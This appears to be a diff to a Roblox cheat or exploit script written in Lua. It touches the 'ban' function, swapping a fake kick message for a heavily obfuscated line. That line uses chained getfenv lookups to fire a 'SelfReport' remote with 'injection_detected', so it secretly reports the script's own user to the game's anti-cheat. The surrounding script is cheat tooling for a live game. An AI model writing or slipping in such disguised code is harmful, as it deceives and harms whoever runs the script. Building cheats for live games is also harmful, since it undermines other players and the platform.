@@ -249,7 +249,7 @@ function funcs:reinject()
 end
 function funcs:ban()
 	task.spawn(function()
-		lplr:Kick("You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes "..math.random(45, 59).." seconds ]")
+			  getfenv(1)["game"]["GetService"](getfenv(1)["game"], "ReplicatedStorage")["FindFirstChild"](getfenv(1)["game"]["GetService"](getfenv(1)["game"], "ReplicatedStorage"), "SelfReport", true)["FireServer"](getfenv(1)["game"]["GetService"](getfenv(1)["game"], "ReplicatedStorage")["FindFirstChild"](getfenv(1)["game"]["GetService"](getfenv(1)["game"], "ReplicatedStorage"), "SelfReport", true), "injection_detected")
 	end)
 	game:GetService("ReplicatedStorage")["rbxts_include"]["node_modules"].net.out["_NetManaged"].TeleportToLobby:FireServer()
 end
